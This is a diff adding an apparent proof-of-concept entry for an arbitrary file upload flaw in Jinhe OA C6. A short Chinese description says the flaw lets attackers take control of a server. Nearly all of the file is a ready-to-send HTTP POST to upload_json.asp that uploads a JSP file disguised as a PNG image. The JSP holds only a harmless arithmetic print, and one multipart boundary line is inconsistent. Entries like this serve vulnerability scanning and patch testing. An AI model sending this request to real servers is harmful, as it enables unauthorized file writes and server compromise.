@@ -1,0 +1,24 @@
+# 金和OA upload_json.asp 任意文件上传漏洞
+# 金和OA是一款企业级办公自动化软件,旨在提供高效的办公流程管理和协作解决方案。金和OA C6存在任意文件写入漏洞，攻击者可利用该漏洞获取服务器控制权。
+POST /c6/KindEditor1/asp/upload_json.asp?dir=file&acid=80051416&bid=hd_tag_m8mv23qb HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23qb
+RM-PRO-Token: 200cb597af382202292dac64fcb3de3b
+RM-PRO-Time: 1742808336561
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=---------------------------153857212076213662067051609723
+
+-----------------------------153857212076213662067051609723
+Content-Disposition: form-data; name="localUrl"
+
+
+-----------------------------153857212076213662067051609723
+Content-Disposition: form-data; name="imgFile"; filename="hhh.jsp"
+Content-Type: image/png
+
+<% out.println(111*111); %>
+------zqulxi4ku42pfmoelvc0
+Content-Disposition: form-data; name="Submit"
+
+upload
+-----------------------------153857212076213662067051609723--
